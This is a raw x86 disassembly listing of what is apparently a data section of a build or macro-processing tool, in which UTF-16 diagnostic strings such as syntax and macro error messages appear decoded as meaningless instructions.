  438cc1:	add    BYTE PTR [eax+eax*1+0x69],al
  438cc5:	add    BYTE PTR [ebx+0x0],dh
  438cc8:	jo     0x438cca
  438cca:	ins    BYTE PTR es:[edi],dx
  438ccb:	add    BYTE PTR [ecx+0x0],ah
  438cce:	jns    0x438cd0
  438cd0:	and    BYTE PTR [eax],al
  438cd2:	bound  eax,QWORD PTR [eax]
  438cd4:	jb     0x438cd6
  438cd6:	imul   eax,DWORD PTR [eax],0x660065
  438cdc:	and    BYTE PTR [eax],al
  438cde:	jne    0x438ce0
  438ce0:	jae    0x438ce2
  438ce2:	popa   
  438ce3:	add    BYTE PTR [edi+0x0],ah
  438ce6:	add    BYTE PTR gs:[eax],ah
  438ce9:	add    BYTE PTR [ebp+0x0],ch
  438cec:	add    BYTE PTR gs:[ebx+0x0],dh
  438cf0:	jae    0x438cf2
  438cf2:	popa   
  438cf3:	add    BYTE PTR [edi+0x0],ah
  438cf6:	add    BYTE PTR gs:[edx],cl
	...
  438d01:	add    BYTE PTR [eax+0x41],dl
	...
  438d14:	das    
  438d15:	add    BYTE PTR [ebx+0x0],dh
  438d18:	jns    0x438d1a
  438d1a:	outs   dx,BYTE PTR ds:[esi]
  438d1b:	add    BYTE PTR [eax+eax*1+0x61],dh
  438d1f:	add    BYTE PTR [eax+0x0],bh
  438d22:	and    BYTE PTR [eax],al
  438d24:	add    BYTE PTR gs:[edx+0x0],dh
  438d28:	jb     0x438d2a
  438d2a:	outs   dx,DWORD PTR ds:[esi]
  438d2b:	add    BYTE PTR [edx+0x0],dh
  438d2e:	and    BYTE PTR [eax],al
  438d30:	cmp    al,BYTE PTR [eax]
  438d32:	and    BYTE PTR [eax],al
  438d34:	daa    
  438d35:	add    BYTE PTR [ecx],ch
  438d37:	add    BYTE PTR [edi],ah
  438d39:	add    BYTE PTR [eax],ah
  438d3b:	add    BYTE PTR [ebp+0x0],ch
  438d3e:	imul   eax,DWORD PTR [eax],0x730073
  438d44:	imul   eax,DWORD PTR [eax],0x67006e
  438d4a:	and    BYTE PTR [eax],al
  438d4c:	imul   eax,DWORD PTR [eax],0x20006e
  438d52:	ins    DWORD PTR es:[edi],dx
  438d53:	add    BYTE PTR [ecx+0x0],ah
  438d56:	arpl   WORD PTR [eax],ax
  438d58:	jb     0x438d5a
  438d5a:	outs   dx,DWORD PTR ds:[esi]
  438d5b:	add    BYTE PTR [eax],ah
  438d5d:	add    BYTE PTR [ecx+0x0],ch
  438d60:	outs   dx,BYTE PTR ds:[esi]
  438d61:	add    BYTE PTR [esi+0x0],dh
  438d64:	outs   dx,DWORD PTR ds:[esi]
  438d65:	add    BYTE PTR [ebx+0x0],ah
  438d68:	popa   
  438d69:	add    BYTE PTR [eax+eax*1+0x69],dh
  438d6d:	add    BYTE PTR [edi+0x0],ch
  438d70:	outs   dx,BYTE PTR ds:[esi]
  438d71:	add    BYTE PTR [eax],al
  438d73:	add    BYTE PTR [edi],ch
  438d75:	add    BYTE PTR [ebx+0x0],dh
  438d78:	jns    0x438d7a
  438d7a:	outs   dx,BYTE PTR ds:[esi]
  438d7b:	add    BYTE PTR [eax+eax*1+0x61],dh
  438d7f:	add    BYTE PTR [eax+0x0],bh
  438d82:	and    BYTE PTR [eax],al
  438d84:	add    BYTE PTR gs:[edx+0x0],dh
  438d88:	jb     0x438d8a
  438d8a:	outs   dx,DWORD PTR ds:[esi]
  438d8b:	add    BYTE PTR [edx+0x0],dh
  438d8e:	and    BYTE PTR [eax],al
  438d90:	cmp    al,BYTE PTR [eax]
  438d92:	and    BYTE PTR [eax],al
  438d94:	imul   eax,DWORD PTR [eax],0x6c006c
  438d9a:	add    BYTE PTR gs:[edi+0x0],ah
  438d9e:	popa   
  438d9f:	add    BYTE PTR [eax+eax*1+0x20],ch
  438da3:	add    BYTE PTR [ebx+0x0],ah
  438da6:	push   0x72006100
  438dab:	add    BYTE PTR [ecx+0x0],ah
  438dae:	arpl   WORD PTR [eax],ax
  438db0:	je     0x438db2
  438db2:	add    BYTE PTR gs:[edx+0x0],dh
  438db6:	and    BYTE PTR [eax],al
  438db8:	daa    
  438db9:	add    BYTE PTR ds:0x27006300,ah
  438dbf:	add    BYTE PTR [eax],ah
  438dc1:	add    BYTE PTR [ecx+0x0],ch
  438dc4:	outs   dx,BYTE PTR ds:[esi]
  438dc5:	add    BYTE PTR [eax],ah
  438dc7:	add    BYTE PTR [ebp+0x0],ch
  438dca:	popa   
  438dcb:	add    BYTE PTR [ebx+0x0],ah
  438dce:	jb     0x438dd0
  438dd0:	outs   dx,DWORD PTR ds:[esi]
  438dd1:	add    BYTE PTR [eax],al
  438dd3:	add    BYTE PTR [eax+eax*1],ch
  438dd6:	jae    0x438dd8
  438dd8:	jns    0x438dda
  438dda:	outs   dx,BYTE PTR ds:[esi]
  438ddb:	add    BYTE PTR [eax+eax*1+0x61],dh
  438ddf:	add    BYTE PTR [eax+0x0],bh
  438de2:	and    BYTE PTR [eax],al
  438de4:	add    BYTE PTR gs:[edx+0x0],dh
  438de8:	jb     0x438dea
  438dea:	outs   dx,DWORD PTR ds:[esi]
  438deb:	add    BYTE PTR [edx+0x0],dh
  438dee:	and    BYTE PTR [eax],al
  438df0:	cmp    al,BYTE PTR [eax]
  438df2:	and    BYTE PTR [eax],al
  438df4:	imul   eax,DWORD PTR [eax],0x76006e
  438dfa:	popa   
  438dfb:	add    BYTE PTR [eax+eax*1+0x69],ch
  438dff:	add    BYTE PTR [eax+eax*1+0x20],ah
  438e03:	add    BYTE PTR [ebp+0x0],ch
  438e06:	popa   
  438e07:	add    BYTE PTR [ebx+0x0],ah
  438e0a:	jb     0x438e0c
  438e0c:	outs   dx,DWORD PTR ds:[esi]
  438e0d:	add    BYTE PTR [eax],ah
  438e0f:	add    BYTE PTR [ecx+0x0],ch
  438e12:	outs   dx,BYTE PTR ds:[esi]
  438e13:	add    BYTE PTR [esi+0x0],dh
  438e16:	outs   dx,DWORD PTR ds:[esi]
  438e17:	add    BYTE PTR [ebx+0x0],ah
  438e1a:	popa   
  438e1b:	add    BYTE PTR [eax+eax*1+0x69],dh
  438e1f:	add    BYTE PTR [edi+0x0],ch
  438e22:	outs   dx,BYTE PTR ds:[esi]
  438e23:	add    BYTE PTR [eax],ah
  438e25:	add    BYTE PTR [edi],ah
  438e27:	add    BYTE PTR [eax+eax*1],ah
  438e2a:	daa    
  438e2b:	add    BYTE PTR [eax],al
  438e2d:	add    BYTE PTR [eax+eax*1],ah
  438e30:	jae    0x438e32
  438e32:	jns    0x438e34
  438e34:	outs   dx,BYTE PTR ds:[esi]
  438e35:	add    BYTE PTR [eax+eax*1+0x61],dh
  438e39:	add    BYTE PTR [eax+0x0],bh
  438e3c:	and    BYTE PTR [eax],al
  438e3e:	add    BYTE PTR gs:[edx+0x0],dh
  438e42:	jb     0x438e44
  438e44:	outs   dx,DWORD PTR ds:[esi]
  438e45:	add    BYTE PTR [edx+0x0],dh
  438e48:	and    BYTE PTR [eax],al
  438e4a:	cmp    al,BYTE PTR [eax]
  438e4c:	and    BYTE PTR [eax],al
  438e4e:	daa    
  438e4f:	add    BYTE PTR ds:0x20002700,bh
  438e55:	add    BYTE PTR [ebp+0x0],ch
  438e58:	imul   eax,DWORD PTR [eax],0x730073
  438e5e:	imul   eax,DWORD PTR [eax],0x67006e
  438e64:	and    BYTE PTR [eax],al
  438e66:	imul   eax,DWORD PTR [eax],0x20006e
  438e6c:	ins    DWORD PTR es:[edi],dx
  438e6d:	add    BYTE PTR [ecx+0x0],ah
  438e70:	arpl   WORD PTR [eax],ax
  438e72:	jb     0x438e74
  438e74:	outs   dx,DWORD PTR ds:[esi]
  438e75:	add    BYTE PTR [eax],al
  438e77:	add    BYTE PTR [edx],ah
  438e79:	add    BYTE PTR [ebx+0x0],dh
  438e7c:	jns    0x438e7e
  438e7e:	outs   dx,BYTE PTR ds:[esi]
  438e7f:	add    BYTE PTR [eax+eax*1+0x61],dh
  438e83:	add    BYTE PTR [eax+0x0],bh
  438e86:	and    BYTE PTR [eax],al
  438e88:	add    BYTE PTR gs:[edx+0x0],dh
  438e8c:	jb     0x438e8e
  438e8e:	outs   dx,DWORD PTR ds:[esi]
  438e8f:	add    BYTE PTR [edx+0x0],dh
  438e92:	and    BYTE PTR [eax],al
  438e94:	cmp    al,BYTE PTR [eax]
  438e96:	and    BYTE PTR [eax],al
  438e98:	ins    DWORD PTR es:[edi],dx
  438e99:	add    BYTE PTR [ecx+0x0],ah
  438e9c:	arpl   WORD PTR [eax],ax
  438e9e:	jb     0x438ea0
  438ea0:	outs   dx,DWORD PTR ds:[esi]
  438ea1:	add    BYTE PTR [eax],ah
  438ea3:	add    BYTE PTR [esi+0x0],ch
  438ea6:	popa   
  438ea7:	add    BYTE PTR [ebp+0x0],ch
  438eaa:	add    BYTE PTR gs:[eax],ah
  438ead:	add    BYTE PTR [ebp+0x0],ch
  438eb0:	imul   eax,DWORD PTR [eax],0x730073
  438eb6:	imul   eax,DWORD PTR [eax],0x67006e
  438ebc:	add    BYTE PTR [eax],al
  438ebe:	sub    eax,0x79007300
  438ec3:	add    BYTE PTR [esi+0x0],ch
  438ec6:	je     0x438ec8
  438ec8:	popa   
  438ec9:	add    BYTE PTR [eax+0x0],bh
  438ecc:	and    BYTE PTR [eax],al
  438ece:	add    BYTE PTR gs:[edx+0x0],dh
  438ed2:	jb     0x438ed4
  438ed4:	outs   dx,DWORD PTR ds:[esi]
  438ed5:	add    BYTE PTR [edx+0x0],dh
  438ed8:	and    BYTE PTR [eax],al
  438eda:	cmp    al,BYTE PTR [eax]
  438edc:	and    BYTE PTR [eax],al
  438ede:	je     0x438ee0
  438ee0:	add    BYTE PTR gs:[eax+0x0],bh
  438ee4:	je     0x438ee6
  438ee6:	and    BYTE PTR [eax],al
  438ee8:	ins    DWORD PTR es:[edi],dx
  438ee9:	add    BYTE PTR [ebp+0x0],dh
  438eec:	jae    0x438eee
  438eee:	je     0x438ef0
  438ef0:	and    BYTE PTR [eax],al
  438ef2:	data16 add BYTE PTR [edi+0x0],ch
  438ef6:	ins    BYTE PTR es:[edi],dx
  438ef7:	add    BYTE PTR [eax+eax*1+0x6f],ch
  438efb:	add    BYTE PTR [edi+0x0],dh
  438efe:	and    BYTE PTR [eax],al
  438f00:	daa    
  438f01:	add    BYTE PTR [edx],bh
  438f03:	add    BYTE PTR [edi],ah
  438f05:	add    BYTE PTR [eax],ah
  438f07:	add    BYTE PTR [ecx+0x0],ch
  438f0a:	outs   dx,BYTE PTR ds:[esi]
  438f0b:	add    BYTE PTR [eax],ah
  438f0d:	add    BYTE PTR [ebp+0x0],ch
  438f10:	popa   
  438f11:	add    BYTE PTR [ebx+0x0],ah
  438f14:	jb     0x438f16
  438f16:	outs   dx,DWORD PTR ds:[esi]
  438f17:	add    BYTE PTR [eax],al
  438f19:	add    BYTE PTR ds:0x79007300,dh
  438f1f:	add    BYTE PTR [esi+0x0],ch
  438f22:	je     0x438f24
  438f24:	popa   
  438f25:	add    BYTE PTR [eax+0x0],bh
  438f28:	and    BYTE PTR [eax],al
  438f2a:	add    BYTE PTR gs:[edx+0x0],dh
  438f2e:	jb     0x438f30
  438f30:	outs   dx,DWORD PTR ds:[esi]
  438f31:	add    BYTE PTR [edx+0x0],dh
  438f34:	and    BYTE PTR [eax],al
  438f36:	cmp    al,BYTE PTR [eax]
  438f38:	and    BYTE PTR [eax],al
  438f3a:	ins    DWORD PTR es:[edi],dx
  438f3b:	add    BYTE PTR [ecx+0x0],ch
  438f3e:	jae    0x438f40
  438f40:	jae    0x438f42
  438f42:	imul   eax,DWORD PTR [eax],0x67006e
  438f48:	and    BYTE PTR [eax],al
  438f4a:	arpl   WORD PTR [eax],ax
  438f4c:	ins    BYTE PTR es:[edi],dx
  438f4d:	add    BYTE PTR [edi+0x0],ch
  438f50:	jae    0x438f52
  438f52:	imul   eax,DWORD PTR [eax],0x67006e
  438f58:	and    BYTE PTR [eax],al
  438f5a:	add    BYTE PTR fs:[edi+0x0],ch
  438f5e:	jne    0x438f60
  438f60:	bound  eax,QWORD PTR [eax]
  438f62:	ins    BYTE PTR es:[edi],dx
  438f63:	add    BYTE PTR [ebp+0x0],ah
  438f66:	and    BYTE PTR [eax],al
  438f68:	jno    0x438f6a
  438f6a:	jne    0x438f6c
  438f6c:	outs   dx,DWORD PTR ds:[esi]
  438f6d:	add    BYTE PTR [eax+eax*1+0x61],dh
  438f71:	add    BYTE PTR [eax+eax*1+0x69],dh
  438f75:	add    BYTE PTR [edi+0x0],ch
  438f78:	outs   dx,BYTE PTR ds:[esi]
  438f79:	add    BYTE PTR [eax],ah
  438f7b:	add    BYTE PTR [ebp+0x0],ch
  438f7e:	popa   
  438f7f:	add    BYTE PTR [edx+0x0],dh
  438f82:	imul   eax,DWORD PTR [eax],0x0
  438f85:	add    BYTE PTR [edx],ch
  438f87:	add    BYTE PTR [eax+eax*1+0x6f],ah
  438f8b:	add    BYTE PTR [ebp+0x0],dh
  438f8e:	bound  eax,QWORD PTR [eax]
  438f90:	ins    BYTE PTR es:[edi],dx
  438f91:	add    BYTE PTR [ebp+0x0],ah
  438f94:	and    BYTE PTR [eax],al
  438f96:	jno    0x438f98
  438f98:	jne    0x438f9a
  438f9a:	outs   dx,DWORD PTR ds:[esi]
  438f9b:	add    BYTE PTR [eax+eax*1+0x61],dh
  438f9f:	add    BYTE PTR [eax+eax*1+0x69],dh
  438fa3:	add    BYTE PTR [edi+0x0],ch
  438fa6:	outs   dx,BYTE PTR ds:[esi]
  438fa7:	add    BYTE PTR [eax],ah
  438fa9:	add    BYTE PTR [ebp+0x0],ch
  438fac:	popa   
  438fad:	add    BYTE PTR [edx+0x0],dh
  438fb0:	imul   eax,DWORD PTR [eax],0x20
  438fb3:	add    BYTE PTR [esi+0x0],ch
  438fb6:	outs   dx,DWORD PTR ds:[esi]
  438fb7:	add    BYTE PTR [eax+eax*1+0x20],dh
  438fbb:	add    BYTE PTR [ecx+0x0],ah
  438fbe:	ins    BYTE PTR es:[edi],dx
  438fbf:	add    BYTE PTR [eax+eax*1+0x6f],ch
  438fc3:	add    BYTE PTR [edi+0x0],dh
  438fc6:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  438fcb:	add    BYTE PTR [ecx+0x0],ch
  438fce:	outs   dx,BYTE PTR ds:[esi]
  438fcf:	add    BYTE PTR [eax],ah
  438fd1:	add    BYTE PTR [esi+0x0],ch
  438fd4:	popa   
  438fd5:	add    BYTE PTR [ebp+0x0],ch
  438fd8:	add    BYTE PTR gs:[eax],al
	...
  438feb:	add    BYTE PTR [eax],al
  438fed:	add    BYTE PTR [eax],bl
  438fef:	add    BYTE PTR [ebp+0x0],dh
  438ff2:	outs   dx,BYTE PTR ds:[esi]
  438ff3:	add    BYTE PTR [ebx+0x0],ch
  438ff6:	outs   dx,BYTE PTR ds:[esi]
  438ff7:	add    BYTE PTR [edi+0x0],ch
  438ffa:	ja     0x438ffc
  438ffc:	outs   dx,BYTE PTR ds:[esi]
  438ffd:	add    BYTE PTR [eax],ah
  438fff:	add    BYTE PTR [eax+eax*1+0x69],ah
  439003:	add    BYTE PTR [edx+0x0],dh
  439006:	add    BYTE PTR gs:[ebx+0x0],ah
  43900a:	je     0x43900c
  43900c:	imul   eax,DWORD PTR [eax],0x650076
  439012:	and    BYTE PTR [eax],al
  439014:	daa    
  439015:	add    BYTE PTR [ecx],ah
  439017:	add    BYTE PTR ds:0x27007300,ah
  43901d:	add    BYTE PTR [eax],al
  43901f:	add    BYTE PTR [ecx],ch
  439021:	add    BYTE PTR [eax+eax*1+0x69],ah
  439025:	add    BYTE PTR [edx+0x0],dh
  439028:	add    BYTE PTR gs:[ebx+0x0],ah
  43902c:	je     0x43902e
  43902e:	imul   eax,DWORD PTR [eax],0x650076
  439034:	and    BYTE PTR [eax],al
  439036:	popa   
  439037:	add    BYTE PTR [esi+0x0],ch
  43903a:	add    BYTE PTR fs:[edi],ch
  43903d:	add    BYTE PTR [edi+0x0],ch
  439040:	jb     0x439042
  439042:	and    BYTE PTR [eax],al
  439044:	add    BYTE PTR gs:[eax+0x0],bh
  439048:	jo     0x43904a
  43904a:	jb     0x43904c
  43904c:	add    BYTE PTR gs:[ebx+0x0],dh
  439050:	jae    0x439052
  439052:	imul   eax,DWORD PTR [eax],0x6e006f
  439058:	and    BYTE PTR [eax],al
  43905a:	jo     0x43905c
  43905c:	popa   
  43905d:	add    BYTE PTR [edx+0x0],dh
  439060:	je     0x439062
  439062:	and    BYTE PTR [eax],al
  439064:	ins    DWORD PTR es:[edi],dx
  439065:	add    BYTE PTR [ecx+0x0],ch
  439068:	jae    0x43906a
  43906a:	jae    0x43906c
  43906c:	imul   eax,DWORD PTR [eax],0x67006e
  439072:	add    BYTE PTR [eax],al
  439074:	sbb    eax,DWORD PTR [eax]
  439076:	je     0x439078
  439078:	outs   dx,DWORD PTR ds:[esi]
  439079:	add    BYTE PTR [edi+0x0],ch
  43907c:	and    BYTE PTR [eax],al
  43907e:	ins    DWORD PTR es:[edi],dx
  43907f:	add    BYTE PTR [ecx+0x0],ah
  439082:	outs   dx,BYTE PTR ds:[esi]
  439083:	add    BYTE PTR [ecx+0x0],bh
  439086:	and    BYTE PTR [eax],al
  439088:	outs   dx,BYTE PTR ds:[esi]
  439089:	add    BYTE PTR [ebp+0x0],ah
  43908c:	jae    0x43908e
  43908e:	je     0x439090
  439090:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  439095:	add    BYTE PTR [ecx],ah
  439097:	add    BYTE PTR [ecx+0x0],cl
  43909a:	inc    esi
  43909b:	add    BYTE PTR [eax],ah
  43909d:	add    BYTE PTR [edx+0x0],ah
  4390a0:	ins    BYTE PTR es:[edi],dx
  4390a1:	add    BYTE PTR [edi+0x0],ch
  4390a4:	arpl   WORD PTR [eax],ax
  4390a6:	imul   eax,DWORD PTR [eax],0x73
  4390a9:	add    BYTE PTR [eax],al
  4390ab:	add    BYTE PTR [eax],ch
  4390ad:	add    BYTE PTR [ebp+0x0],ah
  4390b0:	outs   dx,BYTE PTR ds:[esi]
  4390b1:	add    BYTE PTR [eax+eax*1+0x2d],ah
  4390b5:	add    BYTE PTR [edi+0x0],ch
  4390b8:	data16 add BYTE PTR ds:0x69006600,ch
  4390bf:	add    BYTE PTR [eax+eax*1+0x65],ch
  4390c3:	add    BYTE PTR [eax],ah
  4390c5:	add    BYTE PTR [esi+0x0],ah
  4390c8:	outs   dx,DWORD PTR ds:[esi]
  4390c9:	add    BYTE PTR [ebp+0x0],dh
  4390cc:	outs   dx,BYTE PTR ds:[esi]
  4390cd:	add    BYTE PTR [eax+eax*1+0x20],ah
  4390d1:	add    BYTE PTR [edx+0x0],ah
  4390d4:	add    BYTE PTR gs:[esi+0x0],ah
  4390d8:	outs   dx,DWORD PTR ds:[esi]
  4390d9:	add    BYTE PTR [edx+0x0],dh
  4390dc:	add    BYTE PTR gs:[eax],ah
  4390df:	add    BYTE PTR [esi+0x0],ch
  4390e2:	add    BYTE PTR gs:[eax+0x0],bh
  4390e6:	je     0x4390e8
  4390e8:	and    BYTE PTR [eax],al
  4390ea:	add    BYTE PTR fs:[ecx+0x0],ch
  4390ee:	jb     0x4390f0
  4390f0:	add    BYTE PTR gs:[ebx+0x0],ah
  4390f4:	je     0x4390f6
  4390f6:	imul   eax,DWORD PTR [eax],0x650076
  4390fc:	add    BYTE PTR [eax],al
  4390fe:	and    BYTE PTR [eax],al
  439100:	jae    0x439102
  439102:	jns    0x439104
  439104:	outs   dx,BYTE PTR ds:[esi]
  439105:	add    BYTE PTR [eax+eax*1+0x61],dh
  439109:	add    BYTE PTR [eax+0x0],bh
  43910c:	and    BYTE PTR [eax],al
  43910e:	add    BYTE PTR gs:[edx+0x0],dh
  439112:	jb     0x439114
  439114:	outs   dx,DWORD PTR ds:[esi]
  439115:	add    BYTE PTR [edx+0x0],dh
  439118:	and    BYTE PTR [eax],al
  43911a:	cmp    al,BYTE PTR [eax]
  43911c:	and    BYTE PTR [eax],al
  43911e:	and    DWORD PTR [eax],eax
  439120:	inc    ebp
  439121:	add    BYTE PTR [eax+eax*1+0x53],cl
  439125:	add    BYTE PTR [ebp+0x0],al
  439128:	and    BYTE PTR [eax],al
  43912a:	jne    0x43912c
  43912c:	outs   dx,BYTE PTR ds:[esi]
  43912d:	add    BYTE PTR [ebp+0x0],ah
  439130:	js     0x439132
  439132:	jo     0x439134
  439134:	add    BYTE PTR gs:[ebx+0x0],ah
  439138:	je     0x43913a
  43913a:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  43913f:	add    BYTE PTR [ebx+0x0],al
  439142:	ins    DWORD PTR es:[edi],dx
  439143:	add    BYTE PTR [ecx+0x0],ch
  439146:	jae    0x439148
  439148:	jae    0x43914a
  43914a:	imul   eax,DWORD PTR [eax],0x67006e
  439150:	and    BYTE PTR [eax],al
  439152:	je     0x439154
  439154:	add    BYTE PTR gs:[edx+0x0],dh
  439158:	ins    DWORD PTR es:[edi],dx
  439159:	add    BYTE PTR [ecx+0x0],ch
  43915c:	outs   dx,BYTE PTR ds:[esi]
  43915d:	add    BYTE PTR [ecx+0x0],ah
  439160:	je     0x439162
  439162:	imul   eax,DWORD PTR [eax],0x67006e
  439168:	and    BYTE PTR [eax],al
  43916a:	arpl   WORD PTR [eax],ax
  43916c:	push   0x72006100
  439171:	add    BYTE PTR [ecx+0x0],ah
  439174:	arpl   WORD PTR [eax],ax
  439176:	je     0x439178
  439178:	add    BYTE PTR gs:[edx+0x0],dh
  43917c:	and    BYTE PTR [eax],al
  43917e:	data16 add BYTE PTR [edi+0x0],ch
  439182:	jb     0x439184
  439184:	and    BYTE PTR [eax],al
  439186:	jae    0x439188
  439188:	je     0x43918a
  43918a:	jb     0x43918c
  43918c:	imul   eax,DWORD PTR [eax],0x67006e
  439192:	das    
  439193:	add    BYTE PTR [eax+0x0],dh
  439196:	jb     0x439198
  439198:	outs   dx,DWORD PTR ds:[esi]
  439199:	add    BYTE PTR [edi+0x0],ah
  43919c:	jb     0x43919e
  43919e:	popa   
  43919f:	add    BYTE PTR [ebp+0x0],ch
  4391a2:	and    BYTE PTR [eax],al
  4391a4:	imul   eax,DWORD PTR [eax],0x76006e
  4391aa:	outs   dx,DWORD PTR ds:[esi]
  4391ab:	add    BYTE PTR [ebx+0x0],ah
  4391ae:	popa   
  4391af:	add    BYTE PTR [eax+eax*1+0x69],dh
  4391b3:	add    BYTE PTR [edi+0x0],ch
  4391b6:	outs   dx,BYTE PTR ds:[esi]
  4391b7:	add    BYTE PTR [eax],ah
  4391b9:	add    BYTE PTR [edx],bh
  4391bb:	add    BYTE PTR [eax],ah
  4391bd:	add    BYTE PTR [edi],ah
  4391bf:	add    BYTE PTR ds:0x27006300,ah
  4391c5:	add    BYTE PTR [eax],al
  4391c7:	add    BYTE PTR [ebx],bl
  4391c9:	add    BYTE PTR [ebx+0x0],dh
  4391cc:	jns    0x4391ce
  4391ce:	outs   dx,BYTE PTR ds:[esi]
  4391cf:	add    BYTE PTR [eax+eax*1+0x61],dh
  4391d3:	add    BYTE PTR [eax+0x0],bh
  4391d6:	and    BYTE PTR [eax],al
  4391d8:	add    BYTE PTR gs:[edx+0x0],dh
  4391dc:	jb     0x4391de
  4391de:	outs   dx,DWORD PTR ds:[esi]
  4391df:	add    BYTE PTR [edx+0x0],dh
  4391e2:	and    BYTE PTR [eax],al
  4391e4:	imul   eax,DWORD PTR [eax],0x20006e
  4391ea:	add    BYTE PTR gs:[eax+0x0],bh
  4391ee:	jo     0x4391f0
  4391f0:	jb     0x4391f2
  4391f2:	add    BYTE PTR gs:[ebx+0x0],dh
  4391f6:	jae    0x4391f8
  4391f8:	imul   eax,DWORD PTR [eax],0x6e006f
  4391fe:	add    BYTE PTR [eax],al
  439200:	and    DWORD PTR [eax],eax
  439202:	imul   eax,DWORD PTR [eax],0x6c006c
  439208:	add    BYTE PTR gs:[edi+0x0],ah
  43920c:	popa   
  43920d:	add    BYTE PTR [eax+eax*1+0x20],ch
  439211:	add    BYTE PTR [ecx+0x0],ah
  439214:	jb     0x439216
  439216:	add    BYTE PTR [di+0x0],dh
  43921a:	ins    DWORD PTR es:[edi],dx
  43921b:	add    BYTE PTR [ebp+0x0],ah
  43921e:	outs   dx,BYTE PTR ds:[esi]
  43921f:	add    BYTE PTR [eax+eax*1+0x20],dh
  439223:	add    BYTE PTR [eax+eax*1+0x6f],dh
  439227:	add    BYTE PTR [eax],ah
  439229:	add    BYTE PTR [ecx],ah
  43922b:	add    BYTE PTR [ebx+0x0],al
  43922e:	dec    ebp
  43922f:	add    BYTE PTR [eax+eax*1+0x53],al
  439233:	add    BYTE PTR [edi+0x0],dl
  439236:	dec    ecx
  439237:	add    BYTE PTR [eax+eax*1+0x43],dl
  43923b:	add    BYTE PTR [eax+0x0],cl
  43923e:	inc    ebp
  43923f:	add    BYTE PTR [ebx+0x0],dl
  439242:	add    BYTE PTR [eax],al
  439244:	and    DWORD PTR [eax],eax
  439246:	jae    0x439248
  439248:	jns    0x43924a
  43924a:	outs   dx,BYTE PTR ds:[esi]
  43924b:	add    BYTE PTR [eax+eax*1+0x61],dh
  43924f:	add    BYTE PTR [eax+0x0],bh
  439252:	and    BYTE PTR [eax],al
  439254:	add    BYTE PTR gs:[edx+0x0],dh
  439258:	jb     0x43925a
  43925a:	outs   dx,DWORD PTR ds:[esi]
  43925b:	add    BYTE PTR [edx+0x0],dh
  43925e:	and    BYTE PTR [eax],al
  439260:	cmp    al,BYTE PTR [eax]
  439262:	and    BYTE PTR [eax],al
  439264:	and    DWORD PTR [eax],eax
  439266:	inc    ebp
  439267:	add    BYTE PTR [esi+0x0],cl
  43926a:	inc    esp
  43926b:	add    BYTE PTR [ecx+0x0],cl
  43926e:	inc    esi
  43926f:	add    BYTE PTR [eax],ah
  439271:	add    BYTE PTR [ebp+0x0],dh
  439274:	outs   dx,BYTE PTR ds:[esi]
  439275:	add    BYTE PTR [ebp+0x0],ah
  439278:	js     0x43927a
  43927a:	jo     0x43927c
  43927c:	add    BYTE PTR gs:[ebx+0x0],ah
  439280:	je     0x439282
  439282:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
	...
  43928f:	add    BYTE PTR [eax],al
  439291:	add    BYTE PTR [eax+eax*1],ah
  439294:	data16 add BYTE PTR [ecx+0x0],ch
  439298:	ins    BYTE PTR es:[edi],dx
  439299:	add    BYTE PTR [ebp+0x0],ah
  43929c:	outs   dx,BYTE PTR ds:[esi]
  43929d:	add    BYTE PTR [ecx+0x0],ah
  4392a0:	ins    DWORD PTR es:[edi],dx
  4392a1:	add    BYTE PTR [ebp+0x0],ah
  4392a4:	and    BYTE PTR [eax],al
  4392a6:	ins    DWORD PTR es:[edi],dx
  4392a7:	add    BYTE PTR [ecx+0x0],ch
  4392aa:	jae    0x4392ac
  4392ac:	jae    0x4392ae
  4392ae:	imul   eax,DWORD PTR [eax],0x67006e
  4392b4:	and    BYTE PTR [eax],al
  4392b6:	sub    BYTE PTR [eax],al
  4392b8:	outs   dx,DWORD PTR ds:[esi]
  4392b9:	add    BYTE PTR [edx+0x0],dh
  4392bc:	and    BYTE PTR [eax],al
  4392be:	ins    DWORD PTR es:[edi],dx
  4392bf:	add    BYTE PTR [ecx+0x0],ah
  4392c2:	arpl   WORD PTR [eax],ax
  4392c4:	jb     0x4392c6
  4392c6:	outs   dx,DWORD PTR ds:[esi]
  4392c7:	add    BYTE PTR [eax],ah
  4392c9:	add    BYTE PTR [ecx+0x0],ch
  4392cc:	jae    0x4392ce
  4392ce:	and    BYTE PTR [eax],al
  4392d0:	outs   dx,BYTE PTR ds:[esi]
  4392d1:	add    BYTE PTR [ebp+0x0],dh
  4392d4:	ins    BYTE PTR es:[edi],dx
  4392d5:	add    BYTE PTR [eax+eax*1+0x29],ch
  4392d9:	add    BYTE PTR [eax],al
  4392db:	add    BYTE PTR [eax],al
  4392dd:	add    BYTE PTR [edi],bl
  4392df:	add    BYTE PTR [ebx+0x0],dh
  4392e2:	jns    0x4392e4
  4392e4:	outs   dx,BYTE PTR ds:[esi]
  4392e5:	add    BYTE PTR [eax+eax*1+0x61],dh
  4392e9:	add    BYTE PTR [eax+0x0],bh
  4392ec:	and    BYTE PTR [eax],al
  4392ee:	add    BYTE PTR gs:[edx+0x0],dh
  4392f2:	jb     0x4392f4
  4392f4:	outs   dx,DWORD PTR ds:[esi]
  4392f5:	add    BYTE PTR [edx+0x0],dh
  4392f8:	and    BYTE PTR [eax],al
  4392fa:	cmp    al,BYTE PTR [eax]
  4392fc:	and    BYTE PTR [eax],al
  4392fe:	daa    
  4392ff:	add    BYTE PTR ds:0x27007300,ah
  439305:	add    BYTE PTR [eax],ah
  439307:	add    BYTE PTR [ebp+0x0],dh
  43930a:	outs   dx,BYTE PTR ds:[esi]
  43930b:	add    BYTE PTR [ebp+0x0],ah
  43930e:	js     0x439310
  439310:	jo     0x439312
  439312:	add    BYTE PTR gs:[ebx+0x0],ah
  439316:	je     0x439318
  439318:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  43931d:	add    BYTE PTR [ecx],ah
  43931f:	add    BYTE PTR [ebx+0x0],dh
  439322:	jns    0x439324
  439324:	outs   dx,BYTE PTR ds:[esi]
  439325:	add    BYTE PTR [eax+eax*1+0x61],dh
  439329:	add    BYTE PTR [eax+0x0],bh
  43932c:	and    BYTE PTR [eax],al
  43932e:	add    BYTE PTR gs:[edx+0x0],dh
  439332:	jb     0x439334
  439334:	outs   dx,DWORD PTR ds:[esi]
  439335:	add    BYTE PTR [edx+0x0],dh
  439338:	and    BYTE PTR [eax],al
  43933a:	cmp    al,BYTE PTR [eax]
  43933c:	and    BYTE PTR [eax],al
  43933e:	jae    0x439340
